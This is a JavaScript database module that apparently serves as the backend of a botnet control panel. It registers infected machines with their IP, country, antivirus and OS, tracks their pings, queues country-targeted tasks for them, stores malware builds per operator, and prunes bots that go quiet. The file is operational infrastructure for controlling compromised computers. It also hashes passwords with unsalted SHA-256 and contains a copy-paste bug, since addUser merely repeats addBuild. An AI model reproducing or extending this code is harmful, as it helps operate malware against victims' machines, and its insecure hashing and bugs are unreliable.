const mongoose = require('mongoose');
const config = require('../config');
const crypto = require('crypto');
const user = require('./models/user');
const bot = require('./models/bot');
const cache = require('../api/cache');

mongoose.set('strictQuery', true);
mongoose.connect(config.dbUri);

const User = mongoose.model('User', user);
const Bot = mongoose.model('Bot', bot);

async function createUser(username, password) {
    const user = new User({
        username: username,
        password: crypto.createHash('sha256').update(password).digest('hex'),
        encryptedKey: crypto.randomBytes(16).toString('hex'),
        tasks: [],
        builds: []
    });

    await user.save();

    cache.reset();

    return user.id;
}

async function getUser(id) {
    const possible = await User.find({ _id: id }).exec();
    if (possible.length == 0) {
        return null;
    }

    return possible[0];
}

async function verifyLogin(username, password) {
    const possible = await User.find({ username: username, password: crypto.createHash('sha256').update(password).digest('hex') }).exec();
    if (possible.length == 0) {
        return null;
    }

    return possible[0];
}

async function changePassword(username, password) {
    await User.findOneAndUpdate({ username: username }, { password: crypto.createHash('sha256').update(password).digest('hex') }).exec();
}

async function addTask(username, goal, param, targeted, countries) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.tasks.push({
        goal: goal,
        param: param,
        date: Date.now(),
        targeted: targeted,
        completed: 0,
        countries: countries
    });

    cache.reset();

    await User.findOneAndUpdate({ username: username }, user);
}

async function addBuild(username, log, path) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.builds.push({
        date: Date.now(),
        log: log,
        path: path
    });

    await User.findOneAndUpdate({ username: username }, user);
}

async function addUser(username, log, path) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return null;
    }

    let user = possible[0];

    user.builds.push({
        date: Date.now(),
        log: log,
        path: path
    });

    await User.findOneAndUpdate({ username: username }, user);
}

async function userExist(username) {
    const possible = await User.find({ username: username }).exec();
    if (possible.length == 0) {
        return false;
    }

    return true;
}

async function addBot(ownerusername, hostname, ip, country, av, os) {
    const bot = new Bot({
        ownerusername: ownerusername,
        hostname: hostname,
        ip: ip,
        country: country,
        av: av,
        os: os,
        firstStart: Date.now(),
        lastPing: Date.now()
    });

    await bot.save();

    return bot.id;
}

async function newPing(id) {
    await Bot.findOneAndUpdate({ _id: id }, { lastPing: Date.now() });
}

async function getTasks(username) {
    const possible = await User.find({ username: username }).lean().exec();
    if (possible.length == 0) {
        return null;
    }

    return possible[0].tasks;
}

async function getBuilds(username) {
    const possible = await User.find({ username: username }).lean().exec();
    if (possible.length == 0) {
        return null;
    }

    return possible[0].builds;
}

async function getBots(username) {
    const possible = await Bot.find({ ownerusername: username }).lean().exec();
    return possible;
}

async function deleteBot(id) {
    await Bot.deleteOne({ _id: id });
}

async function deleteTask(id, username) {
    await User.findOneAndUpdate({ username: username }, { $pull: { tasks: { _id: id } } }, { new: true });
}

async function deleteBuild(id, username) {
    await User.findOneAndUpdate({ username: username }, { $pull: { builds: { _id: id } } }, { new: true });
}

async function clearOldBots() {
    const botsDb = await Bot.find({}).exec();

    for (let i = 0; i < botsDb.length; i++) {
        if ((Date.now() - botsDb[i].lastPing) > 1000*60*60*24*5) {
            await deleteBot(botsDb[i]._id);
        }
    }
}

module.exports = {
    createUser,
    verifyLogin,
    addTask,
    addBot,
    addUser,
    getBuilds,
    getTasks,
    getBots,
    userExist,
    getBots,
    addBuild,
    changePassword,
    deleteTask,
    deleteBuild,
    deleteBot,
    getUser,
    newPing,
    clearOldBots
}